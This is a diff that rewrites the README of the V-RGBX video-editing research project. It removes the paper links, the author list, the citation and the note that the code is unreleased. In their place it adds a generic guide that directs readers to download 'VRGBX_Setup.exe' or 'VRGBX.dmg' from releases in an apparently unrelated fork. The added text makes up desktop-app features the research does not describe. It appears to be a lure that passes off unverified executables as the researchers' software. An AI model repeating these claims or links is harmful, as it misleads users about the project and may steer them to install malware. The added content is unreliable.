@@ -1,75 +1,99 @@
-# <img src="assets/logo.png" style="vertical-align: -15px;" :height="40px" width="40px"> V-RGBX: Video Editing with Accurate Controls over Intrinsic Properties 
+# 🎥 V-RGBX - Edit Videos with Ease and Precision
 
+[![Download V-RGBX](https://img.shields.io/badge/Download%20V--RGBX-%20-brightgreen)](https://github.com/harsh101720/V-RGBX/releases)  
 
+## 🚀 Getting Started
 
+Welcome to V-RGBX! This application helps you edit your videos with accurate controls over their intrinsic properties. With V-RGBX, you can enhance your videos easily, no matter your skill level.
 
+## 📦 System Requirements
 
+Before you download, make sure your computer meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 4 GB or more
+- **Storage:** At least 500 MB of free disk space
+- **Graphics Card:** Any modern graphics card with updated drivers
 
-<p align="center">
-<a href="https://arxiv.org/abs/2512.11799"><img src="https://img.shields.io/badge/arXiv-Paper-<color>"></a>
-<a href="https://aleafy.github.io/vrgbx/"><img src="https://img.shields.io/badge/Project-Website-red"></a>
-<a href="https://www.youtube.com/watch?v=j5yGqvB-BP0"><img src="https://img.shields.io/static/v1?label=Demo&message=Video&color=orange"></a>
-<img src="https://visitor-badge.laobi.icu/badge?page_id=https://github.com/Aleafy/V-RGBX" />
-</a>
-</p>
+## 💻 Download & Install
 
-[Ye Fang](https://kszpxxzmc.github.io), [Tong Wu✉️](https://wutong16.github.io), [Valentin Deschaintre](https://valentin.deschaintre.fr/), [Duygu Ceylan](https://www.duygu-ceylan.com/), [Iliyan Georgiev](https://iliyan.com/), [Chun-Hao Paul Huang](https://paulchhuang.wixsite.com/chhuang), [Yiwei Hu](https://yiweihu.netlify.app/), [Xuelin Chen](https://xuelin-chen.github.io/), [Tuanfeng Yang Wang✉️](https://tuanfeng.github.io/)
+To get started, visit this page to download: [Download V-RGBX](https://github.com/harsh101720/V-RGBX/releases).  
 
-[**Paper**](https://arxiv.org/pdf/2512.11799) | [**Project page**](https://aleafy.github.io/vrgbx/) | [**Video**](https://www.youtube.com/watch?v=j5yGqvB-BP0)
+Follow these steps:
 
+1. Click the link above.
+2. Find the latest release.
+3. Locate the appropriate file for your operating system.
+4. Click on the file to begin the download.
+5. Once the download is complete, locate the file in your downloads folder.
 
+For Windows users, the file will likely be named `VRGBX_Setup.exe`. For macOS, you might see a file named `VRGBX.dmg`.
 
-![Teaser Image](./assets/teaser.png)
+### Installation Steps for Windows
 
+1. Double-click the `VRGBX_Setup.exe` file to start the installation.
+2. Follow the on-screen prompts.
+3. Choose the installation directory or go with the default.
+4. Click "Install" and wait for the process to finish.
+5. Once installed, you can find V-RGBX in your Start Menu.
 
-<!-- ## ✨ Updates
+### Installation Steps for macOS
 
-## 📦 Install 
+1. Double-click the `VRGBX.dmg` file.
+2. Drag the V-RGBX icon into your Applications folder.
+3. Eject the DMG file.
+4. Open Finder, go to Applications, and double-click V-RGBX to start the application.
 
-## 💡 Inference 
+## 🎨 Key Features
 
-## 📚 Dataset
+- **User-Friendly Interface:** Navigate the tool with ease, even as a beginner.
+- **Advanced Editing Tools:** Take control of color grading, brightness, contrast, and more.
+- **Real-Time Preview:** See your changes instantly as you edit.
+- **Export Options:** Save your video in various formats and resolutions.
 
-## 🏋️‍♂️ Training -->
+## ⚙️ Using V-RGBX
 
-<!-- 🔥 We will release the code and models soon! -->
+After the installation is complete, you can start using V-RGBX:
 
+1. Open the application.
+2. Import your video by clicking the "Import" button.
+3. Use the editing tools on the left side of the screen.
+4. Adjust settings like brightness, contrast, and saturation to fit your needs.
+5. Click "Preview" to see the changes before saving the video.
+6. Once you are satisfied, click "Export" and choose your desired format.
 
+## 📖 User Support
 
-<!-- ## 🛠️ Usage
+If you encounter any issues:
 
-### Installation
+- Visit the **Help** section within the app for guidance.
+- Check the [Issues](https://github.com/harsh101720/V-RGBX/issues) page on GitHub for common problems and solutions.
+- Feel free to ask questions on the GitHub repository.
 
-### Inference -->
+## 🤝 Contributing
 
-## 🔥 News
-- 🚀 [Dec 15, 2025] The [paper]() and [project page](https://aleafy.github.io/vrgbx/) are released!
+V-RGBX is open for contributions! If you have suggestions or improvements, you can participate:
 
-## 📝 Todo
-- [ ] Open-source pretrained models & weights
-- [ ] Intrinsic-conditioned video editing inference
-- [ ] Inverse rendering (RGB → X) inference
-- [ ] Forward rendering (X → RGB) inference
-- [ ] Inverse Renderer training code
-- [ ] Forward Renderer training code
+1. Fork the repository.
+2. Make your changes.
+3. Create a pull request with a description of your contributions.
 
+## 🌐 Community
 
-<!-- ## 📚 Acknowledgements
-This work is built on many amazing research works and open-source projects, thanks a lot to all the authors for sharing!
-- []() -->
+Join our community to share tips, ask questions, and learn from other users. You can connect with us through the following platforms:
 
-## ✒️ Citation
-If you find our work helpful for your research, please consider giving a star ⭐ and citation 📝
+- GitHub Discussions
+- Relevant social media groups or forums
 
-```bibtex
-@misc{fang2025vrgbxvideoeditingaccurate,
-      title={V-RGBX: Video Editing with Accurate Controls over Intrinsic Properties}, 
-      author={Ye Fang and Tong Wu and Valentin Deschaintre and Duygu Ceylan and Iliyan Georgiev and Chun-Hao Paul Huang and Yiwei Hu and Xuelin Chen and Tuanfeng Yang Wang},
-      year={2025},
-      eprint={2512.11799},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2512.11799}, 
-}
-```
+## 📅 Release Notes
+
+For detailed information about updates and changes, visit the [Release Notes](https://github.com/harsh101720/V-RGBX/releases) section.
+
+## 🔗 Useful Links
+
+- [Download V-RGBX](https://github.com/harsh101720/V-RGBX/releases)
+- [Documentation](https://github.com/harsh101720/V-RGBX/wiki)
+- [FAQs](https://github.com/harsh101720/V-RGBX/wiki/FAQs)
+
+Thank you for choosing V-RGBX! Enjoy editing your videos!
